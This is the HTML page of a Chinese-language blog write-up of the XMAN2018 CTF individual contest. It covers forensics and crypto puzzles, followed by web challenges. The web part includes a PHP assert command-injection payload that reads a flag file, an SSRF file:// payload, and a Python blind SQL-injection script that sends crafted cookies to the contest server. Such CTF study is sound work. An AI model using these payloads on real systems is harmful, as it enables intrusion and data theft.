@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-hk">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,writeup," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="XMAN2018个人赛这次个人赛，可以说充分体验到自己的菜了,只排第36。赛后复盘，你说题目很难吗？其实并不难，我觉得我更大的问题出在心态上。">
+<meta name="keywords" content="CTF,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XMAN2018_个人赛">
+<meta property="og:url" content="http://yoursite.com/2018/08/13/xman-person/index.html">
+<meta property="og:site_name" content="C0mRaDe&#39;s Blog">
+<meta property="og:description" content="XMAN2018个人赛这次个人赛，可以说充分体验到自己的菜了,只排第36。赛后复盘，你说题目很难吗？其实并不难，我觉得我更大的问题出在心态上。">
+<meta property="og:locale" content="zh-hk">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/10.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/12.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/13.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/14.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/15.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/16.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/17.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/18.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/19.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/20.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/21.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/22.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/23.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/24.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/25.png">
+<meta property="og:updated_time" content="2018-08-13T13:29:35.585Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XMAN2018_个人赛">
+<meta name="twitter:description" content="XMAN2018个人赛这次个人赛，可以说充分体验到自己的菜了,只排第36。赛后复盘，你说题目很难吗？其实并不难，我觉得我更大的问题出在心态上。">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/08/13/xman-person/"/>
+
+
+
+
+
+  <title>XMAN2018_个人赛 | C0mRaDe's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0mRaDe's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">大学生的酸腐和矫情是这世界上最没用的东西.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            歸檔
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/13/xman-person/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0mRaDe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/gabe-crow.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0mRaDe's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XMAN2018_个人赛</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-08-13T21:27:29+08:00">
+                2018-08-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/信息安全/" itemprop="url" rel="index">
+                    <span itemprop="name">信息安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="XMAN2018个人赛"><a href="#XMAN2018个人赛" class="headerlink" title="XMAN2018个人赛"></a>XMAN2018个人赛</h1><p>这次个人赛，可以说充分体验到自己的菜了,只排第36。赛后复盘，你说题目很难吗？其实并不难，我觉得我更大的问题出在心态上。<br><a id="more"></a></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x00-FILE"><a href="#0x00-FILE" class="headerlink" title="0x00 FILE"></a>0x00 FILE</h3><p>这题拿到一个img压缩包，尝试解压，发现解压不了，hxd打开看了下，发现里面有很多图片信息，我全部提了出来看，发现都是些很丑的猫猫狗狗的图片，想过用stegsolve一个个去看，但是那些猫实在是太丑了而且题目出成这样容易被喷。这时候想到img文件会不会受损了，想到一个工具extundelete，extundelete –restore-all可以尝试恢复所有目录和文件。完整过程如下：<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/1.png" alt="image"><strong>flag:flag{fugly_cats_need_luv_2}</strong></p>
+<h3 id="0x01-XMAN通行证"><a href="#0x01-XMAN通行证" class="headerlink" title="0x01 XMAN通行证"></a>0x01 XMAN通行证</h3><p>这题是个签到题，主办方看到这么多人做不出来也是很心急，直接给了非常完整的hint<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/2.png" alt="image">拿到一串base64，解码后是<code>kanbbrgghjl{zb____}vtlaln</code>，直到看到完整的hint之前，其实我也是不会做的，拿这串东西去栅栏加密，key=7的时候，拼出了flag的格式。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/3.png" alt="image">最后拿去凯撒一下<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/5.png" alt="image"><strong>flag:xman{oyay_now_you_get_it}</strong></p>
+<h3 id="0x02-ppap"><a href="#0x02-ppap" class="headerlink" title="0x02 ppap"></a>0x02 ppap</h3><p>题目给了个数据包，查找关键词flag，发现一个数据包，追踪tcp流，发现一大堆base64<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/4.png" alt="image">分离出来是一张海盗图片，一个zip，里面有flag，一个xml文件，这时候我不会做了，爆破爆了很久爆不出来密码。但是作为一个web手，我一手谷歌技能已经点满，随便输了个关键词，找到了原题，附上原题脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get all of the pictures</span></span><br><span class="line">imgs = os.listdir(<span class="string">'images'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Cascade we'll be using for detection</span></span><br><span class="line">cascade = cv2.CascadeClassifier(<span class="string">'cascade.xml'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># From the clues</span></span><br><span class="line">scaling_factor = <span class="number">1.02</span></span><br><span class="line">min_neighbors = <span class="number">70</span>  <span class="comment"># Bumped this up until one pic was left</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> img_name <span class="keyword">in</span> imgs:</span><br><span class="line">    <span class="comment"># Load the image and run the cascade</span></span><br><span class="line">    img = cv2.imread(os.path.join(<span class="string">'images'</span>, img_name))</span><br><span class="line">    detect = cascade.detectMultiScale(img, scaling_factor, min_neighbors)</span><br><span class="line">    <span class="keyword">if</span> len(detect) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> (x, y, w, h) <span class="keyword">in</span> detect:</span><br><span class="line">            <span class="comment"># X marks the spot!</span></span><br><span class="line">            cv2.line(img, (x, y),     (x + w, y + h), (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="number">2</span>)</span><br><span class="line">            cv2.line(img, (x, y + h), (x + w, y),     (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="number">2</span>)</span><br><span class="line">        <span class="comment"># Save the new image</span></span><br><span class="line">        cv2.imwrite(os.path.join(<span class="string">'detected'</span>, img_name), img)</span><br></pre></td></tr></table></figure></p>
+<p>我没想到主办方直接用的原题的flag，大开眼界鸭<br><strong>flag:flag{b31Ng_4_P1r4tE_1s_4lR1GHT_w1Th_M3}</strong></p>
+<h3 id="0x03-AUTOKEY"><a href="#0x03-AUTOKEY" class="headerlink" title="0x03 AUTOKEY"></a>0x03 AUTOKEY</h3><p>给了个pcap包，全是usb流量。用tshark提取下来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r ./example.pcap -T fields -e usb.capdata</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/7.png" alt="image"><br>发现都是8字节的数据，那么就是键盘流量了，解题脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line">mappings = &#123;<span class="string">'04'</span>:<span class="string">"A"</span>,  <span class="string">'05'</span>:<span class="string">"B"</span>,  <span class="string">'06'</span>:<span class="string">"C"</span>, <span class="string">'07'</span>:<span class="string">"D"</span>, <span class="string">'08'</span>:<span class="string">"E"</span>, <span class="string">'09'</span>:<span class="string">"F"</span>, <span class="string">'0A'</span>:<span class="string">"G"</span>,  <span class="string">'0B'</span>:<span class="string">"H"</span>, <span class="string">'0C'</span>:<span class="string">"I"</span>,  <span class="string">'0D'</span>:<span class="string">"J"</span>, <span class="string">'0E'</span>:<span class="string">"K"</span>, <span class="string">'0F'</span>:<span class="string">"L"</span>, <span class="string">'10'</span>:<span class="string">"M"</span>, <span class="string">'11'</span>:<span class="string">"N"</span>,<span class="string">'12'</span>:<span class="string">"O"</span>,  <span class="string">'13'</span>:<span class="string">"P"</span>, <span class="string">'14'</span>:<span class="string">"Q"</span>, <span class="string">'15'</span>:<span class="string">"R"</span>, <span class="string">'16'</span>:<span class="string">"S"</span>, <span class="string">'17'</span>:<span class="string">"T"</span>, <span class="string">'18'</span>:<span class="string">"U"</span>,<span class="string">'19'</span>:<span class="string">"V"</span>, <span class="string">'1A'</span>:<span class="string">"W"</span>, <span class="string">'1B'</span>:<span class="string">"X"</span>, <span class="string">'1C'</span>:<span class="string">"Y"</span>, <span class="string">'1D'</span>:<span class="string">"Z"</span>, <span class="string">'1E'</span>:<span class="string">"1"</span>, <span class="string">'1F'</span>:<span class="string">"2"</span>, <span class="string">'20'</span>:<span class="string">"3"</span>, <span class="string">'21'</span>:<span class="string">"4"</span>, <span class="string">'22'</span>:<span class="string">"5"</span>,  <span class="string">'23'</span>:<span class="string">"6"</span>, <span class="string">'24'</span>:<span class="string">"7"</span>, <span class="string">'25'</span>:<span class="string">"8"</span>, <span class="string">'26'</span>:<span class="string">"9"</span>, <span class="string">'27'</span>:<span class="string">"0"</span>, <span class="string">'28'</span>:<span class="string">"\n"</span>, <span class="string">'2a'</span>:<span class="string">"[DEL]"</span>,  <span class="string">'2B'</span>:<span class="string">"    "</span>, <span class="string">'2C'</span>:<span class="string">" "</span>,  <span class="string">'2D'</span>:<span class="string">"-"</span>, <span class="string">'2E'</span>:<span class="string">"="</span>, <span class="string">'2F'</span>:<span class="string">"["</span>,  <span class="string">'30'</span>:<span class="string">"]"</span>,  <span class="string">'31'</span>:<span class="string">"\\"</span>, <span class="string">'32'</span>:<span class="string">"~"</span>, <span class="string">'33'</span>:<span class="string">";"</span>,  <span class="string">'34'</span>:<span class="string">"'"</span>, <span class="string">'36'</span>:<span class="string">","</span>,  <span class="string">'37'</span>:<span class="string">"."</span> &#125;</span><br><span class="line">normalKeys = &#123;<span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>, <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>, <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>, <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>, <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>, <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>, <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,<span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"'"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,<span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line"></span><br><span class="line">zz=[]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'final.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	a=f.readlines()</span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> a:</span><br><span class="line">		k=k.strip()</span><br><span class="line">		<span class="keyword">if</span> k <span class="keyword">in</span> normalKeys:</span><br><span class="line">			zz.append(normalKeys[k])</span><br><span class="line"><span class="keyword">print</span> zz</span><br></pre></td></tr></table></figure></p>
+<p>这里的final.txt里面是每行一个第三字节的数据(因为直接处理原txt会有莫名问题，我就全部提取出来了)，然后获得这样一串东西：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;CAP&gt;a&lt;CAP&gt;utokey9&apos;88880.decipheer9&apos;&lt;CAP&gt;mplrvffczeyoujfjkybxgzvdgqaurkxzolkolvtufblrnjesqitwahxnsijxpnmplshcjbtyhzealogviaaissplfhlfswfehjncrwhtinsmambvexo&lt;DEL&gt;pze&lt;DEL&gt;iz&apos;0</span><br></pre></td></tr></table></figure></p>
+<p>把前面和后面多余的都去掉，注意DEL那里，要删掉前一个字符，按理说DEL应该是删掉后面一个字符，但是这里确实就是这样的，最后得到的字符串是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mplrvffczeyoujfjkybxgzvdgqaurkxzolkolvtufblrnjesqitwahxnsijxpnmplshcjbtyhzealogviaaissplfhlfswfehjncrwhtinsmambvexpziz</span><br></pre></td></tr></table></figure></p>
+<p>根据提示，这是自动密钥密码，网上找了个脚本，跑了一下就出来了。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/6.png" alt="image"><strong>flag:flag{JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF}</strong></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="0x04-MAKEIT"><a href="#0x04-MAKEIT" class="headerlink" title="0x04 MAKEIT"></a>0x04 MAKEIT</h3><p>很明显的.git源码泄露<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/8.png" alt="image">拿到源码，看到index.php有一行这样的代码<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/9.png" alt="image">很明显是一个容易利用的注入点，可以实现任意命令执行。因为知道flag的位置，可以构造如下payload直接读flag，用到了php的一个特性，可以用.号连接不同的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?page=&apos;.system(&apos;cat templates/flag.php&apos;).&apos;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/10.png" alt="image"><br><strong>flag:XMAN{flag_is_so_cool}</strong><br>这里我深入了一下，发现这样是可以命令执行的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert(<span class="string">"file_exists(''.phpinfo().'')"</span>);</span><br><span class="line">assert(<span class="string">"file_exists(phpinfo())"</span>);</span><br></pre></td></tr></table></figure></p>
+<p>这样就不行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(<span class="string">"file_exists('phpinfo()')"</span>);</span><br></pre></td></tr></table></figure></p>
+<p>括号内换成别的函数或者根本没有函数也是一样的，参数错误只会报个警告，该执行的都会执行，重要的是要执行的命令不能在引号内。</p>
+<h3 id="0x05-SIMPLE-SSRF"><a href="#0x05-SIMPLE-SSRF" class="headerlink" title="0x05 SIMPLE SSRF"></a>0x05 SIMPLE SSRF</h3><p><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/11.png" alt="image"><br>这题目大概就是发送一个请求到目标url，然后返回页面信息，限制了必须是<code>www.baidu.com</code><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/12.png" alt="image">首先尝试了训练时用过的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://@www.baidu.com/etc/flag.txt</span><br></pre></td></tr></table></figure></p>
+<p>发现不行，开始乱试，加了个#，就可以了，后端加了个/后缀。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/13.png" alt="image"><br><strong>flag:XMAN{f1l3_pr0toc0l_1s_us3ful}</strong></p>
+<h3 id="0x06-bbsqli"><a href="#0x06-bbsqli" class="headerlink" title="0x06 bbsqli"></a>0x06 bbsqli</h3><p>这题我比赛时没有做出来，赛后复盘的时候做了，很简单的题目。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/14.png" alt="image">给了个输入框，无论你输入什么都会原封不动放到右边。<br>比赛的时候，我不知道时哪里来的逻辑，看到这道题的cookie构造和别的题的cookie一样，就放弃了cookie注入的想法，然而，这道题就是cookie注入。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/15.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/XMAN_person/16.png" alt="image">可以看到，是个很简单的布尔型盲注，直接手注就可以出来。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://202.112.51.184:16080/index.php"</span></span><br><span class="line">proxies=&#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_Cookies</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line">	cookies=&#123;</span><br><span class="line">	<span class="string">"PHPSESSID"</span>:<span class="string">"a4a67189e1e57cef77d1743ae8419820' and ascii(mid((select flag from `[GDJM_flag]`),%d,1))=%d# "</span>%(b,c)&#125;</span><br><span class="line">	<span class="keyword">return</span> cookies</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	ses=requests.session()</span><br><span class="line">	row=<span class="number">0</span></span><br><span class="line">	pos=<span class="number">1</span></span><br><span class="line">	name=<span class="string">''</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">				r=ses.post(url=url,data=&#123;<span class="string">'secret'</span>:<span class="string">'sas'</span>&#125;,cookies=Get_Cookies(row,pos,i))</span><br><span class="line">				<span class="keyword">if</span> len(r.content)&gt;<span class="number">10000</span>:</span><br><span class="line">					name+=chr(i)</span><br><span class="line">					pos+=<span class="number">1</span></span><br><span class="line">					<span class="keyword">print</span> name</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">print</span> e</span><br></pre></td></tr></table></figure></p>
